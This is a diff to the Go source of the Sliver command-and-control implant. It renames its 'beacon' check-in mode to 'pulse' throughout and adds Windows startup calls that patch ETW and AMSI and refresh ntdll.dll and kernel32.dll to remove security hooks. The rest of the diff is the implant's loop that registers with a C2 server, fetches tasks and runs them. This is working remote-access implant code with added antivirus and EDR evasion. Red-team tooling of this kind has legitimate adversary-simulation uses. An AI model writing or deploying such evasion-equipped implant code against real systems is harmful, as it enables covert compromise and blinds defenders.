@@ -28,7 +28,7 @@ import (
 	"time"
 	"uuid"
 
-	// {{if .Config.IsBeacon}}
+	// {{if .Config.IsPulse}}
 	"sync"
 	// {{end}}
 
@@ -37,6 +37,9 @@ import (
 	// {{end}}
 
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
+	// {{if eq .Config.GOOS "windows"}}
+	"github.com/bishopfox/sliver/implant/sliver/evasion"
+	// {{end}}
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
@@ -74,8 +77,8 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 	for {
 		select {
 		default:
-			// {{if .Config.IsBeacon}}
-			beaconStartup()
+			// {{if .Config.IsPulse}}
+			pulseStartup()
 			// {{else}}
 			sessionStartup()
 			// {{end}}
@@ -118,43 +121,50 @@ func Main() {
 
 	limits.ExecLimits() // Check to see if we should execute
 
+	// {{if eq .Config.GOOS "windows"}}
+	evasion.PatchETW()
+	evasion.PatchAMSI()
+	evasion.RefreshPE("ntdll.dll")
+	evasion.RefreshPE("kernel32.dll")
+	// {{end}}
+
 	// {{if .Config.IsService}}
 	svc.Run("{{if .Config.ServiceName}}{{.Config.ServiceName}}{{else}}{{end}}", &sliverService{})
 	// {{else}}
 
-	// {{if .Config.IsBeacon}}
-	beaconStartup()
-	// {{else}} ------- IsBeacon/IsSession -------
+	// {{if .Config.IsPulse}}
+	pulseStartup()
+	// {{else}} ------- IsPulse/IsSession -------
 	sessionStartup()
 	// {{end}}
 
 	// {{end}} ------- IsService -------
 }
 
-// {{if .Config.IsBeacon}}
-func beaconStartup() {
+// {{if .Config.IsPulse}}
+func pulseStartup() {
 	// {{if .Config.Debug}}
-	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
+	log.Printf("Running in Pulse mode with ID: %s", InstanceID)
 	// {{end}}
 	abort := make(chan struct{})
 	defer func() {
 		abort <- struct{}{}
 	}()
-	beacons := transports.StartBeaconLoop(abort)
-	pendingResults := &beaconResultQueue{}
-	for beacon := range beacons {
+	pulses := transports.StartPulseLoop(abort)
+	pendingResults := &pulseResultQueue{}
+	for pulse := range pulses {
 		// {{if .Config.Debug}}
-		log.Printf("Next beacon = %v", beacon)
+		log.Printf("Next pulse = %v", pulse)
 		// {{end}}
-		if beacon != nil {
-			// skip stale beacons when c2-uri has changed
-			if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
+		if pulse != nil {
+			// skip stale pulses when c2-uri has changed
+			if c2 := transports.GetC2URI(); c2 != "" && c2 != pulse.ActiveC2 {
 				// {{if .Config.Debug}}
-				log.Printf("[beacon] skipping stale beacon for %s, c2-uri is %s", beacon.ActiveC2, c2)
+				log.Printf("[pulse] skipping stale pulse for %s, c2-uri is %s", pulse.ActiveC2, c2)
 				// {{end}}
 				continue
 			}
-			err := beaconMainLoop(beacon, pendingResults)
+			err := pulseMainLoop(pulse, pendingResults)
 			if err != nil {
 				connectionErrors++
 				if transports.GetMaxConnectionErrors() < connectionErrors {
@@ -163,7 +173,7 @@ func beaconStartup() {
 			}
 		}
 		// skip 1m reconnect sleep if c2-uri just changed
-		if c2 := transports.GetC2URI(); c2 != "" && (beacon == nil || c2 != beacon.ActiveC2) {
+		if c2 := transports.GetC2URI(); c2 != "" && (pulse == nil || c2 != pulse.ActiveC2) {
 			continue
 		}
 		reconnect := transports.GetReconnectInterval()
@@ -209,19 +219,19 @@ func sessionStartup() {
 
 // {{end}}
 
-// {{if .Config.IsBeacon}}
-type beaconResultQueue struct {
+// {{if .Config.IsPulse}}
+type pulseResultQueue struct {
 	mu      sync.Mutex
 	results []*sliverpb.Envelope
 }
 
-func (q *beaconResultQueue) add(result *sliverpb.Envelope) {
+func (q *pulseResultQueue) add(result *sliverpb.Envelope) {
 	q.mu.Lock()
 	defer q.mu.Unlock()
 	q.results = append(q.results, result)
 }
 
-func (q *beaconResultQueue) drain() []*sliverpb.Envelope {
+func (q *pulseResultQueue) drain() []*sliverpb.Envelope {
 	q.mu.Lock()
 	defer q.mu.Unlock()
 	results := q.results
@@ -229,7 +239,7 @@ func (q *beaconResultQueue) drain() []*sliverpb.Envelope {
 	return results
 }
 
-func (q *beaconResultQueue) prepend(results []*sliverpb.Envelope) {
+func (q *pulseResultQueue) prepend(results []*sliverpb.Envelope) {
 	if len(results) == 0 {
 		return
 	}
@@ -241,28 +251,28 @@ func (q *beaconResultQueue) prepend(results []*sliverpb.Envelope) {
 	q.results = combined
 }
 
-func beaconMainLoop(beacon *transports.Beacon, pendingResults *beaconResultQueue) error {
-	// Register beacon
-	err := beacon.Init()
+func pulseMainLoop(pulse *transports.Pulse, pendingResults *pulseResultQueue) error {
+	// Register pulse
+	err := pulse.Init()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Beacon init error: %s", err)
+		log.Printf("Pulse init error: %s", err)
 		// {{end}}
 		return err
 	}
 	defer func() {
-		err := beacon.Cleanup()
+		err := pulse.Cleanup()
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("[beacon] cleanup failure %s", err)
+			log.Printf("[pulse] cleanup failure %s", err)
 			// {{end}}
 		}
 	}()
 
-	err = beacon.Start()
+	err = pulse.Start()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Error starting beacon: %s", err)
+		log.Printf("Error starting pulse: %s", err)
 		// {{end}}
 		connectionErrors++
 		if transports.GetMaxConnectionErrors() < connectionErrors {
@@ -272,46 +282,46 @@ func beaconMainLoop(beacon *transports.Beacon, pendingResults *beaconResultQueue
 	}
 	connectionErrors = 0
 	// {{if .Config.Debug}}
-	log.Printf("Registering beacon with server")
+	log.Printf("Registering pulse with server")
 	// {{end}}
 	register := registerSliver()
-	register.ActiveC2 = beacon.ActiveC2
-	register.ProxyURL = beacon.ProxyURL
-	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
+	register.ActiveC2 = pulse.ActiveC2
+	register.ProxyURL = pulse.ProxyURL
+	pulse.Send(wrapEnvelope(sliverpb.MsgPulseRegister, &sliverpb.PulseRegister{
 		ID:          InstanceID,
-		Interval:    beacon.Interval(),
-		Jitter:      beacon.Jitter(),
+		Interval:    pulse.Interval(),
+		Jitter:      pulse.Jitter(),
 		Register:    register,
-		NextCheckin: int64(beacon.Duration().Seconds()),
+		NextCheckin: int64(pulse.Duration().Seconds()),
 	}))
 	time.Sleep(time.Second)
-	beacon.Close()
+	pulse.Close()
 
-	return beaconCheckinLoop(beacon, pendingResults, beaconMain)
+	return pulseCheckinLoop(pulse, pendingResults, pulseMain)
 }
 
-type beaconCheckinFunc func(*transports.Beacon, time.Time, *beaconResultQueue) error
+type pulseCheckinFunc func(*transports.Pulse, time.Time, *pulseResultQueue) error
 
-// beaconCheckinLoop schedules check-ins without overlapping them. Beacon
+// pulseCheckinLoop schedules check-ins without overlapping them. Pulse
 // transport callbacks share per-check-in connection state, so the previous
 // check-in must finish closing its resources before the next one can start.
-func beaconCheckinLoop(beacon *transports.Beacon, pendingResults *beaconResultQueue, checkin beaconCheckinFunc) error {
+func pulseCheckinLoop(pulse *transports.Pulse, pendingResults *pulseResultQueue, checkin pulseCheckinFunc) error {
 	for {
-		duration := beacon.Duration()
+		duration := pulse.Duration()
 		nextCheckin := time.Now().Add(duration)
-		oldInterval := beacon.Interval()
-		err := checkin(beacon, nextCheckin, pendingResults)
+		oldInterval := pulse.Interval()
+		err := checkin(pulse, nextCheckin, pendingResults)
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("[beacon] main error: %v", nextCheckin)
+			log.Printf("[pulse] main error: %v", nextCheckin)
 			// {{end}}
 			return err
 		}
 
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] sleep until %v", nextCheckin)
+		log.Printf("[pulse] sleep until %v", nextCheckin)
 		// {{end}}
-		if oldInterval == beacon.Interval() {
+		if oldInterval == pulse.Interval() {
 			// Keep the original start-to-start cadence when the check-in
 			// finishes before its deadline. If it overruns, begin the next
 			// check-in immediately without overlapping shared transport state.
@@ -321,46 +331,46 @@ func beaconCheckinLoop(beacon *transports.Beacon, pendingResults *beaconResultQu
 		}
 
 		// check if reconfig used to set a new C2-URI
-		if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
+		if c2 := transports.GetC2URI(); c2 != "" && c2 != pulse.ActiveC2 {
 			// {{if .Config.Debug}}
-			log.Printf("[beacon] C2 URI changed to %s, reconnecting...", c2)
+			log.Printf("[pulse] C2 URI changed to %s, reconnecting...", c2)
 			// {{end}}
 			return nil
 		}
 	}
 }
 
-func beaconMain(beacon *transports.Beacon, nextCheckin time.Time, pendingResults *beaconResultQueue) error {
-	err := beacon.Start()
+func pulseMain(pulse *transports.Pulse, nextCheckin time.Time, pendingResults *pulseResultQueue) error {
+	err := pulse.Start()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] start failure %s", err)
+		log.Printf("[pulse] start failure %s", err)
 		// {{end}}
 		return err
 	}
 	defer func() {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] closing ...")
+		log.Printf("[pulse] closing ...")
 		// {{end}}
 		time.Sleep(time.Second)
-		beacon.Close()
+		pulse.Close()
 	}()
 
 	// Collect any pending results from background tasks.
 	completedResults := pendingResults.drain()
 
 	// {{if .Config.Debug}}
-	log.Printf("[beacon] sending check in with %d pending results...", len(completedResults))
+	log.Printf("[pulse] sending check in with %d pending results...", len(completedResults))
 	// {{end}}
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+	err = pulse.Send(wrapEnvelope(sliverpb.MsgPulseTasks, &sliverpb.PulseTasks{
 		ID:          InstanceID,
-		NextCheckin: int64(beacon.Duration().Seconds()),
+		NextCheckin: int64(pulse.Duration().Seconds()),
 		Tasks:       completedResults,
 	}))
 	if err != nil {
 		pendingResults.prepend(completedResults)
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] send failure %s", err)
+		log.Printf("[pulse] send failure %s", err)
 		// {{end}}
 		return err
 	}
@@ -371,32 +381,32 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time, pendingResults
 		return nil
 	}
 	// {{if .Config.Debug}}
-	log.Printf("[beacon] recv task(s) ...")
+	log.Printf("[pulse] recv task(s) ...")
 	// {{end}}
-	envelope, err := beacon.Recv()
+	envelope, err := pulse.Recv()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] recv failure %s", err)
+		log.Printf("[pulse] recv failure %s", err)
 		// {{end}}
 		return err
 	}
 	if envelope == nil {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] read nil envelope (no tasks)")
+		log.Printf("[pulse] read nil envelope (no tasks)")
 		// {{end}}
 		return nil
 	}
-	tasks := &sliverpb.BeaconTasks{}
+	tasks := &sliverpb.PulseTasks{}
 	err = proto.Unmarshal(envelope.Data, tasks)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] unmarshal failure %s", err)
+		log.Printf("[pulse] unmarshal failure %s", err)
 		// {{end}}
 		return err
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("[beacon] received %d task(s) from server", len(tasks.Tasks))
+	log.Printf("[pulse] received %d task(s) from server", len(tasks.Tasks))
 	// {{end}}
 	if len(tasks.Tasks) == 0 {
 		return nil
@@ -416,27 +426,27 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time, pendingResults
 
 	// Dispatch tasks to background - results sent to pendingResults as each completes
 	// Extensions must be registered synchronously before other tasks can use them
-	for _, r := range beaconHandleTasklist(tasksExtensionRegister) {
+	for _, r := range pulseHandleTasklist(tasksExtensionRegister) {
 		pendingResults.add(r)
 	}
 
 	// Dispatch other tasks individually - each sends its result when done
-	beaconDispatchTasks(tasksOther, pendingResults)
+	pulseDispatchTasks(tasksOther, pendingResults)
 
 	// {{if .Config.Debug}}
-	log.Printf("[beacon] tasks dispatched to background, check-in complete")
+	log.Printf("[pulse] tasks dispatched to background, check-in complete")
 	// {{end}}
 	return nil
 }
 
-// beaconDispatchTasks dispatches tasks to run in background, sending results as each completes
-func beaconDispatchTasks(tasks []*sliverpb.Envelope, pendingResults *beaconResultQueue) {
+// pulseDispatchTasks dispatches tasks to run in background, sending results as each completes
+func pulseDispatchTasks(tasks []*sliverpb.Envelope, pendingResults *pulseResultQueue) {
 	sysHandlers := handlers.GetSystemHandlers()
 	specHandlers := handlers.GetKillHandlers()
 
 	for _, task := range tasks {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] dispatching task %d", task.Type)
+		log.Printf("[pulse] dispatching task %d", task.Type)
 		// {{end}}
 		if handler, ok := sysHandlers[task.Type]; ok {
 			data := task.Data
@@ -446,9 +456,9 @@ func beaconDispatchTasks(tasks []*sliverpb.Envelope, pendingResults *beaconResul
 				handlers.WrapperHandler(handler, data, func(data []byte, err error) {
 					// {{if .Config.Debug}}
 					if err != nil {
-						log.Printf("[beacon] handler function returned an error: %s", err)
+						log.Printf("[pulse] handler function returned an error: %s", err)
 					}
-					log.Printf("[beacon] task completed (id: %d)", taskID)
+					log.Printf("[pulse] task completed (id: %d)", taskID)
 					// {{end}}
 					pendingResults.add(&sliverpb.Envelope{
 						ID:   taskID,
@@ -461,9 +471,9 @@ func beaconDispatchTasks(tasks []*sliverpb.Envelope, pendingResults *beaconResul
 				handler(data, func(data []byte, err error) {
 					// {{if .Config.Debug}}
 					if err != nil {
-						log.Printf("[beacon] handler function returned an error: %s", err)
+						log.Printf("[pulse] handler function returned an error: %s", err)
 					}
-					log.Printf("[beacon] task completed (id: %d)", taskID)
+					log.Printf("[pulse] task completed (id: %d)", taskID)
 					// {{end}}
 					pendingResults.add(&sliverpb.Envelope{
 						ID:   taskID,
@@ -489,7 +499,7 @@ func beaconDispatchTasks(tasks []*sliverpb.Envelope, pendingResults *beaconResul
 	}
 }
 
-func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
+func pulseHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 	results := []*sliverpb.Envelope{}
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
@@ -498,7 +508,7 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 
 	for _, task := range tasks {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] execute task %d", task.Type)
+		log.Printf("[pulse] execute task %d", task.Type)
 		// {{end}}
 		if handler, ok := sysHandlers[task.Type]; ok {
 			data := task.Data
@@ -510,9 +520,9 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 					defer resultsMutex.Unlock()
 					// {{if .Config.Debug}}
 					if err != nil {
-						log.Printf("[beacon] handler function returned an error: %s", err)
+						log.Printf("[pulse] handler function returned an error: %s", err)
 					}
-					log.Printf("[beacon] task completed (id: %d)", taskID)
+					log.Printf("[pulse] task completed (id: %d)", taskID)
 					// {{end}}
 					results = append(results, &sliverpb.Envelope{
 						ID:   taskID,
@@ -527,9 +537,9 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 					defer resultsMutex.Unlock()
 					// {{if .Config.Debug}}
 					if err != nil {
-						log.Printf("[beacon] handler function returned an error: %s", err)
+						log.Printf("[pulse] handler function returned an error: %s", err)
 					}
-					log.Printf("[beacon] task completed (id: %d)", taskID)
+					log.Printf("[pulse] task completed (id: %d)", taskID)
 					// {{end}}
 					results = append(results, &sliverpb.Envelope{
 						ID:   taskID,
@@ -560,11 +570,11 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("[beacon] waiting for task(s) to complete ...")
+	log.Printf("[pulse] waiting for task(s) to complete ...")
 	// {{end}}
 	wg.Wait() // Wait for all tasks to complete
 	// {{if .Config.Debug}}
-	log.Printf("[beacon] all tasks completed, sending results to server")
+	log.Printf("[pulse] all tasks completed, sending results to server")
 	// {{end}}
 
 	return results
@@ -575,13 +585,13 @@ func openSessionHandler(data []byte) {
 	err := proto.Unmarshal(data, openSession)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] failed to parse open session msg: %s", err)
+		log.Printf("[pulse] failed to parse open session msg: %s", err)
 		// {{end}}
 	}
 
 	if openSession.Delay != 0 {
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] delay %s", time.Duration(openSession.Delay))
+		log.Printf("[pulse] delay %s", time.Duration(openSession.Delay))
 		// {{end}}
 		time.Sleep(time.Duration(openSession.Delay))
 	}
@@ -603,12 +613,12 @@ func openSessionHandler(data []byte) {
 					break
 				}
 				// {{if .Config.Debug}}
-				log.Printf("[beacon] failed to connect to server: %s", err)
+				log.Printf("[pulse] failed to connect to server: %s", err)
 				// {{end}}
 			}
 			if len(openSession.C2S) <= connectionAttempts {
 				// {{if .Config.Debug}}
-				log.Printf("[beacon] failed to connect to server, max connection attempts reached")
+				log.Printf("[pulse] failed to connect to server, max connection attempts reached")
 				// {{end}}
 				break
 			}
@@ -616,7 +626,7 @@ func openSessionHandler(data []byte) {
 	}()
 }
 
-// {{end}} -IsBeacon
+// {{end}} -IsPulse
 
 func sessionMainLoop(connection *transports.Connection) error {
 	if connection == nil {
